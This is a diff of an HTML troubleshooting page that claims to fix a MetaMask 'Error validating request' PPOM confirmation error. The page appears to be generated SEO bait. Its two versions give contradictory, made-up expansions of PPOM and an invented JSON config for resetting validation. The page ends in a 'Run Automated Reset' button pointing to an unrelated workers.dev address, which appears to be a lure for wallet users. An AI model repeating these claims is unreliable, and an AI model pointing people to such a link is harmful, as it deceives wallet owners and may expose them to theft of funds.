@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Confirmations Security Alerts Error Validation – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0f111a;
+        font-family: sans-serif;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,37 +42,34 @@
 <h1>Metamask Extension Bug Confirmations Security Alerts Error Validation</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message when attempting to confirm transactions, specifically with the Metamask extension, which mentions a validation issue related to PPOM (Payload Origin Verification Mechanism) connection.</li>
+<li>Users encounter an error message "Error validating request" when attempting to confirm transactions or access security alerts within the Metamask extension, specifically related to PPOM (Pending Parent Outsized Multi) confirmations.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch in the payload origin verification mechanism between the request initiator and the Metamask extension, leading to a security alert and failure in validating the request.</li>
+<li>The error occurs due to a mismatch between the expected and actual transaction structures during the validation process, potentially caused by outdated extension versions, incorrect network configurations, or issues with the PPOM mechanism.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the network settings to ensure they match the expected configuration for the transaction.</li>
-<li>Reset the Metamask extension to its default settings to remove any conflicting preferences.</li>
-<li>Update the transaction payload to include the correct origin verification parameters, as shown in the following example:</li>
+<li>Update Metamask extension to the latest version to ensure compatibility with the latest Ethereum network updates.</li>
+<li>Verify that the Ethereum network is correctly configured and set to the intended chain ID.</li>
+<li>Utilize the following JSON configuration to reset the PPOM validation parameters:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...user_address&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...contract_address&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...amount&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas_limit&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas_price&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;nonce&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...nonce&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;payloadOrigin&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://example.com&quot;</span>
+<span class="w">  </span><span class="nt">&quot;ppomValidation&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external Ethereum console for more direct control over transaction parameters.</p>
+<p>Consider utilizing an external console for further debugging and customization of your Metamask configuration.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ensure Metamask is updated to the latest version.</li>
-<li>Verify the Ethereum network is correctly selected.</li>
-<li>Check for any browser extensions that might interfere with Metamask's functionality.</li>
+<li>Metamask extension installed and configured on your browser.</li>
+<li>Ethereum wallet set up and connected to the Metamask extension.</li>
+<li>Basic understanding of Ethereum network configurations and transaction structures.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
